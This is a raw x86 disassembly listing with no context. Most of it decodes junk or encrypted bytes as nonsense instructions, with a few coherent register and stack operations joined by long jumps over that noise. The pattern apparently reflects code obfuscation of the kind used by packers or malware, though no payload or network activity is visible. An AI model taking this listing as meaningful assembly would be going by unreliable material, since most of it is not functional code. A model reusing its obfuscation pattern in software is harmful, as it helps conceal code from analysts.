  42240a:	hlt    
  42240b:	or     ebp,DWORD PTR [eax+0x5a]
  42240e:	cdq    
  42240f:	fcom   DWORD PTR [esi-0x7ffcf7c9]
  422415:	imul   ecx,DWORD PTR [eax+0x792810b4],0x954b4f12
  42241f:	pop    esp
  422420:	pop    ecx
  422421:	loop   0x422470
  422423:	add    dh,cl
  422425:	jmp    0x422424
  422427:	scas   eax,DWORD PTR es:[edi]
  422428:	push   0x54
  42242a:	loope  0x4224a4
  42242c:	scas   eax,DWORD PTR es:[edi]
  42242d:	xchg   ebp,eax
  42242e:	sar    BYTE PTR [esi+0x55],0xc2
  422432:	cwde   
  422433:	add    eax,0xcd1b6
  422438:	sub    eax,0x14646cd0
  42243d:	or     al,0xb3
  42243f:	xchg   edi,eax
  422440:	fcmovbe st,st(6)
  422442:	sub    DWORD PTR [ebx+ecx*1-0x12],ecx
  422446:	cmp    dl,ah
  422448:	xchg   ecx,eax
  422449:	ins    BYTE PTR es:[edi],dx
  42244a:	jnp    0x422477
  42244c:	mov    eax,0x3731474e
  422451:	sub    DWORD PTR [esi+0xb5bce32],edi
  422457:	fidiv  DWORD PTR [ebx+ebp*4+0xa]
  42245b:	jae    0x422404
  42245d:	push   0x46
  42245f:	scas   eax,DWORD PTR es:[edi]
  422460:	pop    ebx
  422461:	(bad)  
  422462:	pop    ebx
  422463:	push   esi
  422464:	push   ds
  422465:	inc    esp
  422466:	bound  edi,QWORD PTR [edx+edi*1]
  422469:	or     eax,DWORD PTR [ebp-0x2c9df6f7]
  42246f:	xor    DWORD PTR [edx],esp
  422471:	cmc    
  422472:	mov    gs,WORD PTR [eax]
  422474:	scas   al,BYTE PTR es:[edi]
  422475:	adc    DWORD PTR ds:0xc2b4e2ab,esi
  42247b:	loop   0x4224f5
  42247d:	(bad)  
  42247e:	(bad)  
  42247f:	jecxz  0x42245e
  422481:	or     BYTE PTR [ecx-0x5a9d9b16],ch
  422487:	(bad)  
  422488:	dec    ebp
  422489:	gs lahf 
  42248b:	cld    
  42248c:	mov    dh,0xc9
  42248e:	repz or BYTE PTR [eax-0x3b],0x83
  422493:	mov    DWORD PTR [ecx+0x45],esp
  422496:	sub    dl,bh
  422498:	jns    0x42248d
  42249a:	mov    bh,0x42
  42249c:	stc    
  42249d:	mov    DWORD PTR [edx-0x38],edi
  4224a0:	pushf  
  4224a1:	sti    
  4224a2:	pop    esi
  4224a3:	ins    DWORD PTR es:[edi],dx
  4224a4:	dec    esi
  4224a5:	push   ebx
  4224a6:	inc    ebx
  4224a7:	gs cmp ebp,ebx
  4224aa:	xchg   edi,eax
  4224ab:	mov    ?,WORD PTR [esi-0x32a171c]
  4224b1:	sti    
  4224b2:	mov    edx,0xf8558b0a
  4224b7:	or     eax,0x601
  4224bc:	jmp    0x42258a
  4224c1:	dec    edx
  4224c2:	daa    
  4224c3:	pop    esp
  4224c4:	aam    0x7d
  4224c6:	dec    edx
  4224c8:	mov    edi,0xa1a9af5e
  4224cd:	jecxz  0x4224ce
  4224cf:	jp     0x42253a
  4224d1:	sbb    eax,0xb1000192
  4224d6:	add    BYTE PTR [eax],al
  4224d8:	add    BYTE PTR [ebp+0x456f104c],bh
  4224de:	xchg   edx,eax
  4224df:	mov    ebx,0x1f0bc50b
  4224e4:	mov    edx,0x717a3766
  4224e9:	enter  0xf159,0x6e
  4224ed:	dec    ebx
  4224ee:	push   es
  4224ef:	hlt    
  4224f0:	mov    BYTE PTR [ecx-0x49bc0e5],dh
  4224f6:	sbb    BYTE PTR [edi-0x1a],ch
  4224f9:	add    eax,0x416e9fef
  4224fe:	jno    0x42255b
  422500:	push   0xffffff98
  422502:	pop    edi
  422503:	fst    DWORD PTR [edi]
  422505:	xor    eax,0x390462c2
  42250a:	mov    esp,0x398e2ce0
  42250f:	mov    al,0xe0
  422511:	pop    ebp
  422512:	xchg   ebp,eax
  422513:	push   ecx
  422514:	mov    ah,0x2a
  422516:	mov    cl,0xd2
  422518:	dec    edi
  422519:	push   ds
  42251a:	push   ss
  42251b:	fdecstp 
  42251d:	xor    bh,BYTE PTR [esi]
  42251f:	lods   eax,DWORD PTR ds:[esi]
  422520:	out    dx,eax
  422521:	pop    ebp
  422522:	ja     0x42254b
  422524:	mov    ds:0xf6e5c798,eax
  422529:	loope  0x4225a1
  42252b:	mov    ds:0xef08ea70,eax
  422530:	inc    DWORD PTR [ecx+edx*4-0x2d]
  422534:	mov    ch,0x5f
  422536:	mov    ch,0x49
  422538:	xor    ah,cl
  42253a:	in     eax,dx
  42253b:	ret    
  42253c:	in     al,0x86
  42253e:	cmp    DWORD PTR [eax],ebp
  422540:	retf   
  422541:	mov    DWORD PTR [ebx],ecx
  422543:	and    eax,0x42e081b8
  422548:	xchg   ebp,eax
  422549:	mov    eax,ds:0xa20b399c
  42254e:	ins    BYTE PTR es:[edi],dx
  42254f:	mov    esi,0x599b8b4d
  422554:	ins    DWORD PTR es:[edi],dx
  422555:	in     eax,0xd3
  422557:	sar    DWORD PTR [ecx-0x489e3573],0x3a
  42255e:	adc    DWORD PTR [bx+si],ebx
  422561:	imul   ebp,ebp,0x9d6a289e
  422567:	pop    edx
  422568:	lock dec ebp
  42256a:	mov    eax,ecx
  42256c:	or     al,0x7f
  42256e:	push   0xffffff91
  422570:	fwait
  422571:	js     0x422565
  422573:	jecxz  0x4225b6
  422575:	mov    ds:0x7966c5dd,eax
  42257a:	or     BYTE PTR [ebp-0x2d],ah
  42257d:	xor    edi,esi
  42257f:	adc    al,0xbb
  422581:	std    
  422582:	dec    ecx
  422583:	xlat   BYTE PTR ds:[ebx]
  422584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422585:	enter  0x839a,0x2e
  422589:	push   DWORD PTR ds:0xffffe0ef
  42258f:	jmp    0x42265d
  422594:	enter  0x1182,0xc5
  422598:	pop    ebx
  422599:	xlat   BYTE PTR ds:[ebx]
  42259a:	fmul   QWORD PTR [edi+0x335cb77d]
  4225a0:	mov    DWORD PTR [edx-0x6d319a18],esp
  4225a6:	add    DWORD PTR [eax],eax
  4225a8:	mov    cl,0x0
  4225aa:	add    BYTE PTR [eax],al
  4225ac:	and    DWORD PTR [eax],esp
  4225ae:	adc    bh,bh
  4225b0:	xchg   edi,eax
  4225b1:	push   ss
  4225b2:	dec    esi
  4225b3:	mov    ebp,0xd0f2b8de
  4225b8:	sbb    BYTE PTR ds:0xfb783d44,ah
  4225be:	cmp    DWORD PTR [esi],esp
  4225c0:	dec    edx
  4225c1:	mov    edx,0xd35f700
  4225c6:	and    DWORD PTR [ecx+0x52],esp
  4225c9:	popa   
  4225ca:	push   ebx
  4225cb:	xchg   BYTE PTR [ecx],al
  4225cd:	xchg   esp,eax
  4225ce:	sub    dl,ah
  4225d0:	cmp    BYTE PTR [ecx],dl
  4225d2:	retf   0xd4e6
  4225d5:	scas   eax,DWORD PTR es:[edi]
  4225d6:	xchg   ecx,eax
  4225d7:	mov    ds:0x78a030a6,eax
  4225dc:	xlat   BYTE PTR ds:[ebx]
  4225dd:	xchg   BYTE PTR [edx+esi*2],ch
  4225e0:	sahf   
  4225e1:	jl     0x4225da
  4225e3:	out    dx,eax
  4225e4:	mov    al,ds:0xdabd1aa7
  4225e9:	fadd   st(7),st
  4225eb:	fcmovnbe st,st(6)
  4225ed:	cmp    BYTE PTR [esi+0x2c],0xfb
  4225f1:	test   DWORD PTR [ebx-0x39e739de],0x60a73de8
  4225fb:	cmp    DWORD PTR [ecx-0x2e24d3b0],ebp
  422601:	test   DWORD PTR [edx-0x7f],ebx
  422604:	fbstp  TBYTE PTR [ebx*1+0x4d2f50f4]
  42260b:	inc    ebx
  42260c:	or     BYTE PTR [edx],dh
  42260e:	pop    ds
  42260f:	cmp    edi,edx
  422611:	inc    esi
  422612:	fcomp  DWORD PTR [ebp+eax*2-0x30]
  422616:	mov    ds:0x72de88bf,al
  42261b:	xchg   BYTE PTR [eax],dh
  42261d:	mov    edi,0xa37f43a2
  422622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422623:	mov    dh,0x6c
  422625:	sar    DWORD PTR [ecx+0x50637dea],cl
  42262b:	into   
  42262c:	addr16 retf 
  42262e:	mov    edi,0x5ee67f01
  422633:	mov    al,ds:0xdcc00e1a
  422638:	sub    DWORD PTR [ebx+0xa],0xfffffffe
  42263c:	out    dx,al
  42263d:	or     bl,bh
  42263f:	gs mov edi,0x505281c9
  422645:	inc    DWORD PTR [ecx-0x6e]
  422648:	mov    ds:0xc39b0df2,eax
  42264d:	sub    BYTE PTR [esi+ecx*4],ah
  422650:	mov    cl,0x7f
  422652:	jb     0x422664
  422654:	sbb    esp,DWORD PTR [ebp+ebp*4-0x12]
  422658:	loop   0x422609
  42265a:	gs aaa 
  42265c:	shl    BYTE PTR [ebx],cl
  42265e:	ret    0x1925
  422661:	pop    edi
  422662:	add    BYTE PTR [eax],al
  422664:	mov    DWORD PTR [ebp-0xc],eax
  422667:	mov    DWORD PTR [ebp-0x8],ebx
  42266a:	mov    DWORD PTR [ebp-0x24],0x47ff
  422671:	mov    eax,DWORD PTR [ebp-0x24]
  422674:	mov    ebx,DWORD PTR [ebp-0x8]
  422677:	jmp    0x422745
  42267c:	mov    bl,0xbf
  42267e:	xor    BYTE PTR [esp+edi*1],ah
  422681:	scas   eax,DWORD PTR es:[edi]
  422682:	mov    bh,0xbf
  422684:	rcr    BYTE PTR [ebp+0x17a267a5],cl
  42268a:	aaa    
  42268b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42268c:	jg     0x422621
  42268e:	add    DWORD PTR [eax],eax
  422690:	mov    cl,0x0
  422692:	add    BYTE PTR [eax],al
  422694:	xchg   edi,eax
  422695:	push   es
  422696:	imul   ebx,DWORD PTR [ecx+0x42],0xffffffc8
  42269a:	dec    esi
  42269b:	add    ecx,DWORD PTR [edi]
  42269d:	addr16 mov dl,0x85
  4226a0:	inc    esp
  4226a1:	gs jmp 0x5599a4d7
  4226a7:	jecxz  0x42262f
  4226a9:	push   0x7e1a9a34
  4226ae:	and    ah,BYTE PTR [ebp+edx*4+0x68]
  4226b2:	pop    ds
  4226b3:	xor    DWORD PTR [edi-0x67062d9b],edx
  4226b9:	jmp    0x8e778cbd
  4226be:	iret   
  4226bf:	cmp    eax,0x82aa0a74
  4226c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226c5:	xor    dh,al
  4226c7:	arpl   WORD PTR [eax],bx
  4226c9:	jg     0x42265b
  4226cb:	cwde   
  4226cc:	fild   QWORD PTR [ebx+ecx*2-0x73]
  4226d0:	aaa    
  4226d1:	dec    ecx
  4226d2:	push   0xffffffa6
  4226d4:	sbb    ebx,esp
  4226d6:	dec    esp
  4226d7:	cmp    esi,DWORD PTR [esi+0x12]
  4226da:	xchg   ecx,eax
  4226db:	ja     0x42266f
  4226dd:	loop   0x4226e4
  4226df:	fst    QWORD PTR [ebp+esi*2-0x136ae05]
  4226e6:	mov    ch,0xfc
  4226e8:	mov    ebx,0x7e888885
  4226ed:	mov    esi,0x2903ffc5
  4226f2:	rcr    BYTE PTR [ecx-0x7d],0x40
  4226f6:	inc    ebp
  4226f7:	imul   ecx,DWORD PTR [ecx+0xf3c69c7],0x46
  4226fe:	test   al,0x7a
  422700:	retf   
  422701:	(bad)  
  422702:	fiadd  DWORD PTR [edx+ebx*4+0x77340d1c]
  422709:	dec    esi
  42270a:	pop    ss
  42270b:	add    eax,0xbabc3099
  422710:	and    al,0x47
  422712:	cli    
  422713:	xchg   esp,eax
  422714:	jmp    0x245c16f0
  422719:	jb     0x422756
  42271b:	cdq    
  42271c:	fxam   
  42271e:	sbb    DWORD PTR [ebx+0x7f600720],edx
  422724:	aad    0x50
  422726:	enter  0xdf0a,0x51
  42272a:	mov    ah,0x1c
  42272c:	jmp    0x4226e9
  42272e:	loope  0x42274d
  422730:	push   DWORD PTR [edi+ecx*2-0x71ff612c]
  422737:	xchg   DWORD PTR [ecx],esp
  422739:	dec    eax
  42273a:	sar    DWORD PTR [edx-0x9],cl
  42273d:	pop    ebp
  42273e:	dec    edi
  42273f:	sbb    cl,BYTE PTR [ebx-0x6f4b5afb]
  422745:	and    eax,edi
  422747:	jmp    0x422815
  42274c:	icebp  
  42274d:	push   ds
  42274e:	ret    0xefa6
  422751:	(bad)  
  422752:	cmc    
  422753:	pop    edi
  422754:	xchg   ecx,eax
  422755:	mov    ds:0x8872c3db,eax
  42275a:	test   al,0x38
  42275c:	xor    BYTE PTR [ecx+eax*1+0xb100],dl
  422763:	add    BYTE PTR [ebp+0x48],ch
  422766:	mov    dh,0xd6
  422768:	popa   
  422769:	inc    esi
  42276a:	push   edx
  42276b:	out    0x9c,eax
  42276d:	aaa    
  42276e:	jnp    0x4227c7
  422770:	stos   BYTE PTR es:[edi],al
  422771:	cmp    cl,ah
  422773:	int3   
  422774:	test   eax,0x41a3432f
  422779:	pop    edi
  42277a:	stos   BYTE PTR es:[edi],al
  42277b:	push   edi
  42277c:	mov    ds:0x769014c,eax
  422781:	(bad)  
  422782:	push   eax
  422783:	scas   al,BYTE PTR es:[edi]
  422784:	icebp  
  422785:	cmova  edx,ecx
  422788:	jp     0x4227f8
  42278a:	cwde   
  42278b:	mov    bh,0x93
  42278d:	add    eax,0xef1241c6
  422792:	std    
  422793:	inc    esi
  422794:	mov    bl,cl
  422796:	and    eax,DWORD PTR [esi+0x3c]
  422799:	add    eax,0xacc1b8e4
  42279e:	adc    eax,0xb1d171d0
  4227a3:	std    
  4227a4:	push   0xf91cb7b7
  4227a9:	clc    
  4227aa:	inc    eax
  4227ab:	in     eax,0x25
  4227ad:	or     eax,0xa74b67be
  4227b2:	sub    ecx,ebx
  4227b4:	xlat   BYTE PTR ds:[ebx]
  4227b5:	sbb    al,cl
  4227b7:	push   eax
  4227b8:	bndstx [edi],bnd1
  4227bb:	add    ebp,DWORD PTR [esi-0x1]
  4227be:	pushf  
  4227bf:	and    esi,DWORD PTR [esi-0xcfe9fdc]
  4227c5:	push   edx
  4227c6:	(bad)  
  4227c7:	xor    al,0x77
  4227c9:	xor    DWORD PTR [eax-0x2f448fe7],esi
  4227cf:	test   eax,0x1b68be35
  4227d4:	jle    0x422764
  4227d6:	mov    edi,0x1b0b6d67
  4227db:	das    
  4227dc:	mov    bh,0x12
  4227de:	add    BYTE PTR [edx+ebp*4],bl
  4227e1:	int    0x90
  4227e3:	js     0x4227a9
  4227e5:	sub    ch,BYTE PTR [esi]
  4227e7:	je     0x4227b8
  4227e9:	scas   al,BYTE PTR es:[edi]
  4227ea:	push   edi
  4227eb:	iret   
  4227ec:	test   DWORD PTR [edx-0x44aa42d8],edx
  4227f2:	fs cmp al,0xb1
  4227f5:	xchg   BYTE PTR [esi-0x6d],dl
  4227f8:	pop    es
  4227f9:	push   edx
  4227fa:	xor    eax,0x1240ddfd
  4227ff:	bound  esp,QWORD PTR [edi+ecx*4]
  422802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422803:	loope  0x4227a3
  422805:	aad    0xd
  422807:	or     BYTE PTR [eax-0x7],bh
  42280a:	push   es
  42280b:	or     esp,edi
  42280d:	mov    eax,0x5208a930
  422812:	es dec ebx
  422814:	inc    ecx
  422815:	xor    edx,edx
  422817:	xor    eax,ecx
  422819:	div    ebx
  42281b:	mov    edx,DWORD PTR [ebp-0xc]
  42281e:	cmp    eax,edx
  422820:	jae    0x423513
  422826:	mov    DWORD PTR [ebp-0x14],0x4de2
  42282d:	mov    DWORD PTR [ebp-0x18],0x3726
  422834:	jmp    0x422902
  422839:	mov    ebp,0xefe7c953
  42283e:	(bad)  
  42283f:	mov    edi,0x5b06a15b
  422844:	dec    esi
  422845:	sbb    esi,DWORD PTR [esi]
  422847:	xchg   ebx,eax
  422848:	int    0xe1
  42284a:	xchg   esp,eax
  42284b:	add    DWORD PTR [eax],eax
  42284d:	mov    cl,0x0
  42284f:	add    BYTE PTR [eax],al
  422851:	rcr    BYTE PTR [edi],1
  422853:	jle    0x4227f2
  422855:	div    BYTE PTR [ebp+0x5050822b]
  42285b:	xor    DWORD PTR ds:0xed796d70,ecx
  422861:	push   esi
  422862:	mov    ds:0x29ca08f0,al
  422867:	fcom   DWORD PTR gs:[eax]
  42286a:	mov    ah,0x77
  42286c:	fwait
  42286d:	inc    esi
  42286e:	std    
  42286f:	push   ebx
  422870:	fimul  WORD PTR [esi-0x46]
  422873:	frstor [ebp-0x780407b0]
  422879:	imul   BYTE PTR [eax]
  42287b:	pop    ebx
  42287c:	dec    ebx
  42287d:	addr16 mov dh,0x96
  422880:	sbb    al,ah
  422882:	xchg   edi,eax
  422883:	add    BYTE PTR [eax+eiz*1+0x49cca9be],ah
  42288a:	(bad)
  42288d:	loop   0x42282d
  42288f:	mov    ebp,?
  422891:	(bad)  
  422892:	test   DWORD PTR [ebx+0xe],0x2642d475
  422899:	jnp    0x422874
  42289b:	mov    BYTE PTR [edi-0x2ec6494],0x68
  4228a2:	lahf   
  4228a3:	ja     0x4228f8
  4228a5:	xchg   ebp,eax
  4228a6:	and    al,0xa7
  4228a8:	and    dl,BYTE PTR [eax+0x8]
  4228ab:	xor    cl,bh
  4228ad:	out    dx,al
  4228ae:	loope  0x4228dd
  4228b0:	and    ebx,DWORD PTR [edx]
  4228b2:	cmp    al,BYTE PTR [ecx-0xb]
  4228b5:	cmc    
  4228b6:	int    0xdf
  4228b8:	sysenter 
  4228ba:	pushf  
  4228bb:	ins    DWORD PTR es:[edi],dx
  4228bc:	in     al,0xd9
  4228be:	in     eax,0xd3
  4228c0:	test   eax,0xfae91f26
  4228c5:	jmp    0xe27a530a
  4228ca:	push   edx
  4228cb:	test   DWORD PTR [esi-0x46461abc],eax
  4228d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228d2:	adc    edi,DWORD PTR [ebx]
  4228d4:	adc    DWORD PTR [ebx-0x5b7e4dda],edx
  4228da:	xchg   DWORD PTR [esi+0x8919150],edx
  4228e0:	pop    esp
  4228e1:	adc    DWORD PTR [esi+0x64],0xe0741950
  4228e8:	mov    gs,eax
  4228ea:	or     esi,DWORD PTR [edi-0x64]
  4228ed:	and    al,0xef
  4228ef:	push   ebx
  4228f0:	sub    DWORD PTR [edx+esi*8+0x61],ebp
  4228f4:	jbe    0x42293c
  4228f6:	mov    eax,0x5ee2a615
  4228fb:	or     esp,esi
  4228fd:	push   esp
  4228fe:	xchg   ecx,eax
  4228ff:	sbb    DWORD PTR [esp+eax*2+0x39f445c7],0xc700002e
  42290a:	inc    ebp
  42290b:	clc    
  42290c:	push   es
  42290d:	jl     0x42290f
  42290f:	add    bh,al
  422911:	inc    ebp
  422912:	fmul   QWORD PTR [ecx]
  422914:	imul   eax,DWORD PTR [eax],0xc9e900
  42291a:	add    BYTE PTR [eax],al
  42291c:	fsubr  st,st(4)
  42291e:	fwait
  42291f:	mov    eax,0xecfbffbf
  422924:	cmp    cl,BYTE PTR [eax]
  422926:	lahf   
  422927:	les    esi,FWORD PTR [esi]
  422929:	dec    ecx
  42292a:	push   ecx
  42292b:	dec    esi
  42292c:	xchg   edx,eax
  42292d:	xchg   ebp,eax
  42292e:	add    DWORD PTR [eax],eax
  422930:	mov    cl,0x0
  422932:	add    BYTE PTR [eax],al
  422934:	xchg   ebx,eax
  422935:	mov    bl,0x48
  422937:	popa   
  422938:	ja     0x422900
  42293a:	push   edx
  42293b:	push   esi
  42293c:	pop    es
  42293d:	in     al,dx
  42293e:	jae    0x4228d9
  422940:	js     0x422966
  422942:	pop    esp
  422943:	add    esp,ebx
  422945:	push   es
  422946:	test   DWORD PTR [eax+0x57],esi
  422949:	push   0xffffffb2
  42294b:	mov    edx,edi
  42294d:	inc    esp
  42294e:	stc    
  42294f:	repz in al,dx
  422951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422952:	push   0x42
  422954:	mov    edi,0xc7e809b7
  422959:	sub    cl,BYTE PTR [eax+0x2b]
  42295c:	leave  
  42295d:	push   es
  42295e:	cmp    bl,ch
  422960:	mov    ds:0xde00ed89,eax
  422965:	adc    BYTE PTR [edi+edx*4+0x737ea2dd],ch
  42296c:	outs   dx,DWORD PTR ds:[esi]
  42296d:	adc    BYTE PTR [ecx-0x51],ah
  422970:	mov    ebx,0x4cb07445
  422975:	mov    dl,0x57
  422977:	sbb    eax,0xb9d19418
  42297c:	pusha  
  42297d:	test   al,0x75
  42297f:	dec    ebp
  422980:	bound  edi,QWORD PTR [ebx]
  422982:	loopne 0x42291d
  422984:	add    ch,BYTE PTR [edi-0x6e]
  422987:	pushf  
  422988:	lea    ebp,[ecx+0x3f]
  42298b:	in     eax,0xc0
  42298d:	pop    edi
  42298e:	aad    0xb8
  422990:	mov    eax,esi
  422992:	inc    ecx
  422993:	adc    ebp,DWORD PTR [ecx-0x73729473]
  422999:	jo     0x4229ae
  42299b:	loopne 0x4229a9
  42299d:	in     al,dx
  42299e:	jae    0x422989
  4229a0:	test   al,0x54
  4229a2:	jnp    0x422a11
  4229a4:	mov    dh,0xd9
  4229a6:	retf   0x18e5
  4229a9:	and    DWORD PTR [eax-0x34],eax
  4229ac:	inc    esp
  4229ad:	inc    esp
  4229ae:	(bad)  
  4229af:	out    0xe2,al
  4229b1:	mov    ecx,0xbc260049
  4229b6:	mov    ebx,0x5aad189f
  4229bb:	lock or al,BYTE PTR [ecx+0x7cb75edf]
  4229c2:	push   ebp
  4229c3:	cld    
  4229c4:	jmp    0x6298f549
  4229c9:	dec    edi
  4229ca:	mov    fs,esp
  4229cc:	inc    ebp
  4229cd:	lods   al,BYTE PTR ds:[esi]
  4229ce:	jle    0x422976
  4229d0:	push   edi
  4229d1:	mov    ebx,DWORD PTR [esi]
  4229d3:	xlat   BYTE PTR ds:[ebx]
  4229d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229d5:	ret    
  4229d6:	int    0xa8
  4229d8:	add    cl,BYTE PTR ds:0x869a26d7
  4229de:	or     edi,DWORD PTR [eax-0x2a]
  4229e1:	adc    eax,0x8b86c0d7
  4229e6:	inc    ebp
  4229e7:	fmul   QWORD PTR [ebx-0x2fd407ab]
  4229ed:	mov    eax,DWORD PTR [ebp-0xc]
  4229f0:	xor    edx,eax
  4229f2:	mov    eax,DWORD PTR [ebp-0x18]
  4229f5:	sub    edx,0x2897
  4229fb:	jmp    0x422ac9
  422a00:	pop    ecx
  422a01:	lods   eax,DWORD PTR ds:[esi]
  422a02:	fidiv  WORD PTR [ebx]
  422a04:	(bad)  
  422a05:	jae    0x422a04
  422a07:	out    dx,eax
  422a08:	pop    edi
  422a09:	sbb    al,0x3c
  422a0b:	or     eax,0x70e3d59b
  422a10:	inc    ebx
  422a11:	xchg   esi,eax
  422a12:	add    DWORD PTR [eax],eax
  422a14:	mov    cl,0x0
  422a16:	add    BYTE PTR [eax],al
  422a18:	stos   DWORD PTR es:[edi],eax
  422a19:	(bad)  
  422a1a:	sti    
  422a1b:	sub    dl,BYTE PTR [ebx-0x79]
  422a1e:	mov    edx,DWORD PTR ds:0xc6c2e4dc
  422a24:	and    esp,ebx
  422a26:	mov    al,ds:0x759bacde
  422a2b:	xchg   DWORD PTR [edx],eax
  422a2d:	and    ah,ch
  422a2f:	int    0xe9
  422a31:	mov    ds:0x2795e6e0,eax
  422a36:	xor    edi,DWORD PTR [edi+0x14]
  422a39:	xchg   esi,eax
  422a3a:	pusha  
  422a3b:	sbb    eax,0xbf0c5095
  422a40:	xchg   ebp,eax
  422a41:	jmp    0x4229ec
  422a43:	or     al,0xd1
  422a45:	repz mov al,ds:0xde118a0a
  422a4b:	loop   0x422ac9
  422a4d:	(bad)  
  422a4e:	push   0xb85e341e
  422a53:	inc    esi
  422a54:	pop    esi
  422a55:	push   es
  422a56:	outs   dx,DWORD PTR ds:[esi]
  422a57:	inc    esp
  422a58:	lock jg 0x422ab4
  422a5b:	mov    cl,0x67
  422a5d:	aad    0x11
  422a5f:	mov    ch,0xf3
  422a61:	pop    ebx
  422a62:	adc    BYTE PTR [ecx+esi*2-0x57],dl
  422a66:	dec    ecx
  422a67:	dec    ecx
  422a68:	cld    
  422a69:	call   0x2b349b5b
  422a6e:	and    esp,eax
  422a70:	pop    esp
  422a71:	and    DWORD PTR [edx+0x29abdd82],0x2ab69858
  422a7b:	dec    esi
  422a7c:	and    edx,DWORD PTR [ecx-0x360e52b4]
  422a82:	and    eax,0x9ccc7430
  422a87:	cmc    
  422a88:	pop    ss
  422a89:	adc    eax,0xbc980e57
  422a8e:	test   al,0x47
  422a90:	and    eax,0x14d597d5
  422a95:	inc    esi
  422a96:	aad    0x13
  422a98:	test   BYTE PTR [ebx-0x4f39ee5d],cl
  422a9e:	inc    esi
  422a9f:	jbe    0x422b09
  422aa1:	push   esp
  422aa2:	rcl    DWORD PTR [edx-0x3d],0xdd
  422aa6:	adc    DWORD PTR [esi],ecx
  422aa8:	mov    ecx,0x60f46be5
  422aad:	sbb    DWORD PTR [ebx],ecx
  422aaf:	inc    ecx
  422ab0:	(bad)  
  422ab1:	cwde   
  422ab2:	jae    0x422a50
  422ab4:	inc    esp
  422ab5:	addr16 push ecx
  422ab7:	sub    eax,0x4dfaf6b6
  422abc:	sub    al,0x1f
  422abe:	cmp    DWORD PTR [edx-0x16b3c5a8],ecx
  422ac4:	xchg   esp,eax
  422ac5:	enter  0x1dfa,0x6
  422ac9:	imul   edx,eax
  422acc:	jmp    0x422b9a
  422ad1:	loope  0x422b27
  422ad3:	fwait
  422ad4:	pop    ecx
  422ad5:	mov    edi,0x77fce3df
  422ada:	out    0xf8,al
  422adc:	sbb    al,0x9
  422ade:	xor    edi,DWORD PTR ds:0x196f433
  422ae4:	add    BYTE PTR [ecx-0x78000000],dh
  422aea:	sub    BYTE PTR [esi+0xfcc365c],al
  422af0:	loop   0x422a7e
  422af2:	stos   DWORD PTR es:[edi],eax
  422af3:	pop    ds
  422af4:	jbe    0x422aa2
  422af6:	idiv   BYTE PTR [ebx+esi*2-0x2b]
  422afa:	cvtpi2ps xmm5,QWORD PTR [ebx+0x5b6ee435]
  422b01:	ins    DWORD PTR es:[edi],dx
  422b02:	adc    BYTE PTR [ebx+0x4940fa8b],ah
  422b08:	adc    ebx,DWORD PTR [ecx+0x71]
  422b0b:	daa    
  422b0c:	test   DWORD PTR [eax+ebp*1+0x5cafde08],eax
  422b13:	test   BYTE PTR [ecx+0x2eb3efb6],bl
  422b19:	push   eax
  422b1a:	aas    
  422b1b:	xchg   ebx,eax
  422b1c:	xchg   ebx,eax
  422b1d:	push   cs
  422b1e:	push   ebx
  422b1f:	add    bl,BYTE PTR [esi+edi*2+0x9e5e7f7]
  422b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b27:	mov    cl,BYTE PTR [edx+ebx*2-0x7c]
  422b2b:	xchg   esp,eax
  422b2c:	dec    ecx
  422b2d:	jo     0x422b68
  422b2f:	(bad)  
  422b30:	cmc    
  422b31:	xchg   BYTE PTR [ecx+0x6409e2d7],bl
  422b37:	pusha  
  422b38:	add    dh,BYTE PTR [ebx]
  422b3a:	mov    es,WORD PTR [edi+ecx*8-0xc501e8c]
  422b41:	jge    0x422b47
  422b43:	loope  0x422b34
  422b45:	ret    0xa1f4
  422b48:	mov    ebx,0xabae7eae
  422b4d:	inc    ebx
  422b4e:	(bad)  
  422b4f:	ins    BYTE PTR es:[edi],dx
  422b50:	sub    DWORD PTR [ebx+0x7],ebp
  422b53:	retf   0x8ba2
  422b56:	pop    eax
  422b57:	sub    BYTE PTR [edx-0x12a55d77],bh
  422b5d:	push   eax
  422b5e:	arpl   cx,sp
  422b60:	jmp    0x57de:0xf23437eb
  422b67:	in     eax,0xaf
  422b69:	cli    
  422b6a:	repz loope 0x422b7c
  422b6d:	inc    ecx
  422b6e:	inc    ebx
  422b6f:	retf   
  422b70:	sbb    bl,cl
  422b72:	ins    BYTE PTR es:[edi],dx
  422b73:	dec    eax
  422b74:	jae    0x422b70
  422b76:	jns    0x422bd5
  422b78:	xchg   edx,eax
  422b79:	xchg   esp,eax
  422b7a:	(bad)  [esi-0x67]
  422b7d:	mov    eax,ds:0x4692d75a
  422b82:	pusha  
  422b83:	fwait
  422b84:	ror    DWORD PTR [edx],0x22
  422b87:	ds clc 
  422b89:	mov    bl,0x95
  422b8b:	push   0xf76b0d34
  422b90:	nop
  422b91:	add    eax,0x89c22a05
  422b96:	cld    
  422b97:	cmp    bl,BYTE PTR [ecx-0x13ba74f1]
  422b9d:	and    edx,eax
  422b9f:	mov    DWORD PTR [ebp-0x24],edx
  422ba2:	mov    DWORD PTR [ebp-0x8],0x3b78
  422ba9:	jmp    0x422c77
  422bae:	daa    
  422baf:	pop    eax
  422bb0:	push   0x377c7f5c
  422bb5:	jnp    0x422c1d
  422bb7:	imul   ebp,DWORD PTR [ebp-0x57912639],0x197a55f
  422bc1:	add    BYTE PTR [ecx+0x13000000],dh
  422bc7:	dec    ecx
  422bc8:	sub    ecx,DWORD PTR [edi+eiz*4-0x1f]
  422bcc:	jg     0x422bba
  422bce:	arpl   cx,cx
  422bd0:	dec    ecx
  422bd1:	mov    ebx,0x2ac903b0
  422bd6:	pop    es
  422bd7:	cs pop esp
  422bd9:	dec    esp
  422bda:	fsub   DWORD PTR [ecx+0x4]
  422bdd:	inc    esp
  422bde:	pushf  
  422bdf:	addr16 xchg ebx,eax
  422be1:	out    dx,al
  422be2:	je     0x422b8e
  422be4:	test   BYTE PTR [edx-0x5d50accb],bh
  422bea:	cmp    eax,0xa9556904
  422bef:	nop
  422bf0:	add    DWORD PTR [ecx],0xfd77c4f6
  422bf6:	xor    DWORD PTR [edi-0x9],esi
  422bf9:	add    bl,BYTE PTR [edi+0x58a1d2ea]
